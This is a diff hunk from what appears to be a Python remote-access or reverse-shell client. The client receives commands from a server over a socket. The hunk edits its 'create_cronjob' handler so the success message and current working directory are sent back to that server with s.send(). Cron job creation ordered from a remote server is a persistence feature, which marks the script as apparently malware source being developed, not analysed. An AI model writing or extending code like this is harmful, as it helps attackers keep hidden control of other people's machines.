@@ -54,7 +54,10 @@ while True:
                 # get the current working directory as output
                 cwd = os.getcwd()
                 # set the output to success message
-                output = f"Cronjob created successfully!{SEPARATOR}{cwd}"
+                output = "Cronjob created successfully!"
+                # send the results back to the server
+                message = f"{output}{SEPARATOR}{cwd}"
+                s.send(message.encode())
 
             elif splited_command[0].lower() == "destroy_cronjob":
                 # read the current cron jobs
